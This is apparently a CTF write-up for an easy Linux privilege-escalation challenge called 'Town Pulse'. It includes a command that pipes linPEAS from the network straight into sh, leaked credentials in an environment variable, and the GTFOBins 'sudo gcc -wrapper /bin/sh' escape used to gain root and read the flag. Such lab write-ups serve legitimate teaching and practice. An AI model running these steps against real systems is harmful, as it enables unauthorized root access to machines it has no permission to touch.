# CTF Writeup:  Town Pulse

## Challenge Overview
* **Category:** OS Exploitation
* **Difficulty:** ["Easy"]
* **Description:** We have access to a linux box, need to find vulnerabile configuration to escalate privileges and find flag. 


## Tools Used

- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [GTFOBins](https://gtfobins.github.io/)
- bash

---

## Solution

Usual disclaimer here: the following solution was the one that worked and there was some trial and error to find it. Omitting those dead-ends for brevity.  

### Step 1: Initial Access

```bash
ssh Pentester@<ip>

# no response
```

```bash
nmap -sV <ip>

#shows diff port
```

```bash
ssh -p 2222 Pentester@<ip>
```


Challenge requires privilege escalation so let's go script kiddie and fetch a tool to search for privilege escalations ("privesc" as it's call in "the biz"):

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

```

Under Environment we see `JOAN_TEMPORARY_CREDS=jojocreds1`

Well well well. For reasons mysterious there are temp creds for another user in our environment of our account. Let's try sshing into their account and see what permissions they have. Fingers crossed they're in sudoers and we can use their privilege to escalate ours **sinister laughing**. 

What's our target account though? 

```bash
ls /home/
# shows JOan 
```
Its probably the joan account. 

```bash

ssh joan@localhost
# no response
```

---

### Step 2: Priv Esc

Now we have access to joan's account, see what groups she's in

```bash
groups
Joan sudo
```

Cool, now let's add our pentester account to sudoers

```bash
sudo usermod -aG sudo Pentester
Sorry, user Joan is not allowed to execute '/usr/sbin/usermod -aG sudo Pentester' as root on dad5f987a15f."
```

Nope. Gah! Rubbing my brow here as I was heading for a PB for unfinished challenges in this event. Thankfully team-work makes the dream work and I looked to the east for a teammate wizard saviour:

![image](./gandalf-white.gif)

Lol, thanks wizard teammate 🧙 10 seconds, one command, and a URL later: 

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

https://gtfobins.github.io/gtfobins/gcc#sudo

Doopdeedoop, let's try that command

```bash
gcc -wrapper /bin/sh,-s .
sudo usermod -aG sudo Pentester
exit
exit
# to log out the pentester and apply the new group, then ssh back in.
```

```bash
ssh -p 2222 Pentester@<ip>
```

```bash
groups
Pentester sudo
```

Huzzah. Now what commands can we run as sudo?
```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/gcc
```

Run that GTFOBin again. 

And Bam! we're root.  

---

### Step 3: Flag Retrieval

Now we are gods, the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first

```bash
find / -name flag.txt -type f
/root/flag.txt
```

Looks promising. 

```bash
cat /root/flag.txt
FLAG{7H15_SUDO_C00K3D_R007}
```

![image](./victory.gif)


---

## Notes

- Don't be afraid to ask for help when you get blocked. Difficult for you can be easy for someone else and vice versa. 
- As a team, set up some tools in comms (like threads in channels) to share progress on challenges.
- Linpeas and gftobins are l337h4x0r was to privesc on linux. 🫶

---


